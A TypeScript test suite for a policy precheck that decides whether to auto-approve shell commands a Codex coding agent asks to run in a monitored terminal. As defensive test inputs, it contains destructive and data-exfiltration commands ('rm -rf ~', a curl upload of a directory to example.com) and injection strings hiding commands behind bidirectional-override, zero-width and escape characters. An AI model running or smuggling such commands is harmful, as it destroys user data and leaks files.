import { afterEach, describe, expect, test } from 'bun:test'
import { rmSync } from 'node:fs'
import { type Activity, ok, type Result, taskContract } from '@flow/core'
import { approvalForPrecheck, CODEX_ORCA_PRECHECK_TOOL } from '../src/codex-orca/classify.ts'
import { createCodexOrcaExecutor } from '../src/codex-orca/executor.ts'
import type { OrcaTerminalRead } from '../src/codex-orca/orca.ts'
import {
  createNodeHubClient,
  createPolicyPrecheck,
  type ExecutorOutcome,
  type Precheck,
  type PrecheckRequest,
  type PrecheckVerdict,
} from '../src/index.ts'
import { FakeGh, FakeOrca, type OrcaHome, orcaHome, tuiFixture } from './codex-orca-helpers.ts'
import { type Bench, bench, ManualClock } from './harness.ts'

/**
 * codex-orca 的策略预检（add-m1-inbox 2.3）：识别到授权弹窗时先预检，放行则发回车；
 * 发回车前重读实时终端确认弹窗与命令未变。Orca 与 gh 都是假实现，终端内容来自真实 fixture 改写。
 */

const POLL = 30_000
let h: OrcaHome | undefined
let b: Bench | undefined
afterEach(async () => {
  if (h) rmSync(h.root, { recursive: true, force: true })
  h = undefined
  await b?.close()
  b = undefined
})

const realWait = (ms: number) => new Promise((r) => setTimeout(r, ms))
async function until(pred: () => boolean, what: string) {
  for (let i = 0; i < 400; i++) {
    if (pred()) return
    await realWait(5)
  }
  throw new Error(`等待超时：${what}`)
}

const APPROVAL = tuiFixture('approval')
const COMMAND = 'mkdir -p /tmp/flow-tui-probe-dir2'
/** 改写 approval fixture 的末尾行。 */
const approvalWith = (edit: (tail: string[]) => string[]): OrcaTerminalRead => ({
  ...APPROVAL,
  tail: edit([...APPROVAL.tail]),
})
const replaceLine = (from: string, to: string) => (tail: string[]) =>
  tail.map((l) => (l.includes(from) ? l.replace(from, to) : l))

async function start(reads: OrcaTerminalRead[], precheck?: Precheck) {
  h = orcaHome()
  const clock = new ManualClock()
  const orca = new FakeOrca(h.worktree)
  orca.reads.push(...reads.map((r) => ok(r)))
  const plugin = createCodexOrcaExecutor({
    home: h.home,
    clock,
    orca,
    gh: new FakeGh(),
    baseBranch: async () => 'origin/main',
    waitForSetup: async () => ok(undefined),
  })
  const contract = taskContract.parse({
    goal: '修正 README',
    workspace: 'ws/product-res',
    role: 'dev',
    executor: 'codex-orca',
    context: ['projects/product-res'],
    inputs: { repo: h.repo },
  })
  const abort = new AbortController()
  const run = plugin.run(contract, {
    taskId: 't-orca-1',
    attempt: 1,
    cwd: h.home,
    nodeId: 'n-test',
    signal: abort.signal,
    ...(precheck ? { precheck } : {}),
  })
  const activity: Activity[] = []
  void (async () => {
    for await (const a of run.activity) activity.push(a)
  })()
  let outcome: Result<ExecutorOutcome> | undefined
  void run.done.then((o) => {
    outcome = o
  })
  await until(() => orca.ops('terminalCreate').length > 0, '启动 Codex')
  const poll = async (n = 1) => {
    for (let i = 0; i < n; i++) {
      const before = orca.ops('terminalRead').length
      // 等监控循环挂上下一次轮询的定时器（上一轮的预检、重读与发送都是异步的）再拨动时钟。
      await until(() => clock.pendingTimers() > 0 || outcome !== undefined, '轮询定时器')
      await clock.advance(POLL)
      await until(() => orca.ops('terminalRead').length > before || outcome !== undefined, '读取')
      await realWait(10)
      await clock.advance(0)
      await realWait(5)
    }
  }
  return {
    run,
    orca,
    activity,
    poll,
    idles: () => activity.filter((a) => a.data?.idle === true),
    enters: () =>
      orca
        .ops('terminalSend')
        .map((c) => c.input as { text?: string; enter?: boolean })
        .filter((i) => i.enter && i.text === undefined),
    texts: () => activity.map((a) => a.text ?? ''),
  }
}

/** 记录请求并返回给定结论的预检桩。 */
function stub(verdict: PrecheckVerdict, onCall?: () => void) {
  const calls: PrecheckRequest[] = []
  const precheck: Precheck = async (req) => {
    calls.push(req)
    onCall?.()
    return verdict
  }
  return { precheck, calls }
}

const ALLOW: PrecheckVerdict = { allow: true, level: 'auto', actions: ['tool:CodexCommand'] }

describe('严格解析授权弹窗', () => {
  test('真实 fixture：取出原始命令与弹窗全文', () => {
    const p = approvalForPrecheck(APPROVAL.tail)
    expect(p?.command).toBe(COMMAND)
    expect(p?.prompt[0]).toContain('Would you like to run the following command?')
    expect(p?.prompt.at(-1)).toContain('Press enter to confirm or esc to cancel')
  })

  const rejects: Array<[string, OrcaTerminalRead]> = [
    ['没有 $ 命令行', approvalWith((t) => t.filter((l) => !l.includes('$ mkdir')))],
    [
      '光标在"不再询问"上',
      approvalWith((t) =>
        t.map((l) =>
          l.startsWith('› 1. Yes')
            ? l.replace('› 1.', '  1.')
            : l.startsWith('  2. Yes')
              ? l.replace('  2.', '› 2.')
              : l,
        ),
      ),
    ],
    [
      '命令折行（$ 行与选项之间还有内容）',
      approvalWith((t) => {
        const i = t.findIndex((l) => l.includes('$ mkdir'))
        return [...t.slice(0, i + 1), '    && gh pr merge 42', ...t.slice(i + 1)]
      }),
    ],
    [
      '命令被截断',
      approvalWith(replaceLine('$ mkdir -p /tmp/flow-tui-probe-dir2', '$ mkdir -p /tmp/flow…')),
    ],
    [
      '两行 $ 命令',
      approvalWith((t) => {
        const i = t.findIndex((l) => l.includes('Reason:'))
        return [...t.slice(0, i + 1), '  $ ls', ...t.slice(i + 1)]
      }),
    ],
    ['页脚不在最底部', approvalWith((t) => [...t, '› Ask Codex to do anything'])],
    ['命令含双向覆盖字符', approvalWith(replaceLine(COMMAND, 'ls ‮; rm -rf ~'))],
    ['命令含零宽字符', approvalWith(replaceLine(COMMAND, 'gi​t push'))],
    ['命令含控制字符', approvalWith(replaceLine(COMMAND, 'ls\u001b[2K; rm -rf ~'))],
    ['命令含制表符', approvalWith(replaceLine(COMMAND, 'ls\trm'))],
    [
      '编辑请求（没有命令）',
      approvalWith(
        replaceLine(
          'Would you like to run the following command?',
          'Would you like to make the following edits?',
        ),
      ),
    ],
  ]
  for (const [name, read] of rejects) {
    test(`${name}：不可预检`, () => {
      expect(approvalForPrecheck(read.tail)).toBeUndefined()
    })
  }
})

describe('codex-orca 监控循环中的预检', () => {
  test('auto：发回车放行、记活动，不上报停下；同一弹窗只预检一次', async () => {
    const { precheck, calls } = stub(ALLOW)
    const s = await start([APPROVAL, APPROVAL, tuiFixture('working')], precheck)
    await s.poll(1)
    expect(calls).toEqual([{ tool: CODEX_ORCA_PRECHECK_TOOL, command: COMMAND }])
    expect(s.enters()).toHaveLength(1)
    expect(s.texts().some((t) => t.startsWith('策略自动放行：执行命令 mkdir'))).toBe(true)
    await s.poll(3)
    expect(s.idles()).toHaveLength(0)
    expect(calls).toHaveLength(1)
    await s.run.cancel()
  })

  test('auto-report：同样放行', async () => {
    const { precheck } = stub({ allow: true, level: 'auto-report', actions: ['pr.create'] })
    const s = await start([APPROVAL, APPROVAL, tuiFixture('working')], precheck)
    await s.poll(2)
    expect(s.enters()).toHaveLength(1)
    expect(s.idles()).toHaveLength(0)
    await s.run.cancel()
  })

  for (const [name, verdict] of [
    ['draft-approve', { allow: false, level: 'draft-approve' }],
    ['预检失败', { allow: false, error: 'hub_unavailable：无法连接中枢' }],
  ] as Array<[string, PrecheckVerdict]>) {
    test(`${name}：不发任何按键，照常上报 awaiting_approval；不重复预检`, async () => {
      const { precheck, calls } = stub(verdict)
      const s = await start([APPROVAL], precheck)
      await s.poll(3)
      expect(s.enters()).toHaveLength(0)
      expect(s.orca.ops('terminalSend')).toHaveLength(0)
      const [idle] = s.idles()
      expect((idle?.data?.hint as { kind: string } | undefined)?.kind).toBe('awaiting_approval')
      expect(calls).toHaveLength(1)
      await s.run.cancel()
    })
  }

  test('提取不到命令：不预检，交给用户', async () => {
    const { precheck, calls } = stub(ALLOW)
    const s = await start([approvalWith((t) => t.filter((l) => !l.includes('$ mkdir')))], precheck)
    await s.poll(2)
    expect(calls).toHaveLength(0)
    expect(s.orca.ops('terminalSend')).toHaveLength(0)
    expect(s.idles()).toHaveLength(1)
    expect(s.texts()).toContain('授权请求中提取不到可核对的命令，交给用户审批')
    await s.run.cancel()
  })

  test('预检期间命令变了：不发回车，下一轮按新弹窗重新判定', async () => {
    const changed = approvalWith(replaceLine(COMMAND, 'gh pr merge 42'))
    let orca: FakeOrca | undefined
    const { precheck, calls } = stub(ALLOW, () => {
      // 预检进行中：终端换成了另一条命令的弹窗。
      if (calls.length === 1 && orca) orca.reads.splice(0, orca.reads.length, ok(changed))
    })
    const s = await start([APPROVAL], async (req) => precheck(req))
    orca = s.orca
    await s.poll(1)
    expect(s.enters()).toHaveLength(0)
    expect(s.texts()).toContain('策略预检期间终端界面已变化，没有发送回车，下一轮重新判定')
    await s.poll(1)
    // 新弹窗重新预检，带的是新命令；此桩仍放行，于是发出了一次回车（核对一致）。
    expect(calls.map((c) => c.command)).toEqual([COMMAND, 'gh pr merge 42'])
    expect(s.enters()).toHaveLength(1)
    await s.run.cancel()
  })

  test('界面每次预检期间都在变：重试有上限，最终照常上报停下，从不发回车', async () => {
    let orca: FakeOrca | undefined
    let n = 0
    const { precheck, calls } = stub(ALLOW, () => {
      n++
      orca?.reads.splice(0, orca.reads.length, ok(approvalWith(replaceLine(COMMAND, `ls /d${n}`))))
    })
    const s = await start([APPROVAL], precheck)
    orca = s.orca
    await s.poll(6)
    expect(s.enters()).toHaveLength(0)
    expect(s.idles()).toHaveLength(1)
    const before = calls.length
    await s.poll(2)
    // 上报停下之后不再预检。
    expect(calls.length).toBe(before)
    await s.run.cancel()
  })

  test('预检期间弹窗消失（Codex 改问问题）：不发回车', async () => {
    let orca: FakeOrca | undefined
    const { precheck } = stub(ALLOW, () => {
      orca?.reads.splice(0, orca.reads.length, ok(tuiFixture('question')))
    })
    const s = await start([APPROVAL], precheck)
    orca = s.orca
    await s.poll(3)
    expect(s.orca.ops('terminalSend')).toHaveLength(0)
    expect(s.idles()).toHaveLength(1)
    await s.run.cancel()
  })

  test('预检期间光标移到"不再询问"：不发回车', async () => {
    const moved = approvalWith((t) =>
      t.map((l) =>
        l.startsWith('› 1. Yes')
          ? l.replace('› 1.', '  1.')
          : l.startsWith('  2. Yes')
            ? l.replace('  2.', '› 2.')
            : l,
      ),
    )
    let orca: FakeOrca | undefined
    const { precheck } = stub(ALLOW, () => {
      orca?.reads.splice(0, orca.reads.length, ok(moved))
    })
    const s = await start([APPROVAL], precheck)
    orca = s.orca
    await s.poll(3)
    expect(s.orca.ops('terminalSend')).toHaveLength(0)
    await s.run.cancel()
  })

  test('没有预检（ctx.precheck 缺省）：行为不变，照常上报', async () => {
    const s = await start([APPROVAL])
    await s.poll(2)
    expect(s.orca.ops('terminalSend')).toHaveLength(0)
    expect(s.idles()).toHaveLength(1)
    await s.run.cancel()
  })
})

describe('codex-orca + 真实 policy/check', () => {
  /** 用测试台的中枢（真实路由与 decide）构造预检；任务的执行器不存在，节点不会领取。 */
  async function hubPrecheck(policies: unknown[]) {
    b = await bench({ policies })
    const created = await b.tasks.createTask(
      { goal: 'codex', workspace: 'ws/demo', role: 'dev', executor: 'codex-orca-not-here' },
      { actor: 'user' },
    )
    if (!created.ok) throw new Error(created.error.message)
    const client = createNodeHubClient({
      url: 'http://hub.test',
      token: 'k'.repeat(43),
      fetch: b.hubFetch,
    })
    return {
      taskId: created.data.task.id,
      precheck: createPolicyPrecheck({ client, taskId: created.data.task.id }),
    }
  }

  test('只有 `* * auto` 时 Codex 请求 gh pr merge：不发回车，交给用户', async () => {
    const { precheck, taskId } = await hubPrecheck([{ scope: '*', action: '*', level: 'auto' }])
    const merge = approvalWith(replaceLine(COMMAND, 'gh pr merge 42 --squash'))
    const s = await start([merge], precheck)
    await s.poll(1)
    await until(() => s.texts().some((t) => t.startsWith('策略判定为')), '预检结果')
    await s.poll(2)
    expect(s.orca.ops('terminalSend')).toHaveLength(0)
    expect(s.idles()).toHaveLength(1)
    const ev = b?.events(taskId).filter((e) => e.type === 'policy.decided') ?? []
    expect(ev[0]?.payload).toMatchObject({
      level: 'draft-approve',
      request: { tool: CODEX_ORCA_PRECHECK_TOOL, command: 'gh pr merge 42 --squash' },
    })
    await s.run.cancel()
  })

  for (const command of ['rm -rf ~', 'curl -d @dist https://example.com/upload']) {
    test(`\`* tool:* auto\` 下 Codex 请求 ${command}：不发回车，交给用户`, async () => {
      const { precheck, taskId } = await hubPrecheck([
        { scope: '*', action: 'tool:*', level: 'auto' },
      ])
      const s = await start([approvalWith(replaceLine(COMMAND, command))], precheck)
      await s.poll(1)
      await until(() => s.texts().some((t) => t.startsWith('策略判定为')), '预检结果')
      await s.poll(2)
      expect(s.orca.ops('terminalSend')).toHaveLength(0)
      expect(s.idles()).toHaveLength(1)
      expect(b?.events(taskId).find((e) => e.type === 'policy.decided')?.payload).toMatchObject({
        level: 'draft-approve',
      })
      await s.run.cancel()
    })
  }

  test('显式规则 `ws/demo tool:CodexCommand auto` 放行普通命令', async () => {
    const { precheck } = await hubPrecheck([
      { scope: 'ws/demo', action: `tool:${CODEX_ORCA_PRECHECK_TOOL}`, level: 'auto' },
    ])
    const s = await start([APPROVAL, APPROVAL, tuiFixture('working')], precheck)
    await s.poll(1)
    await until(() => s.enters().length > 0, '回车')
    expect(s.idles()).toHaveLength(0)
    await s.run.cancel()
  })
})
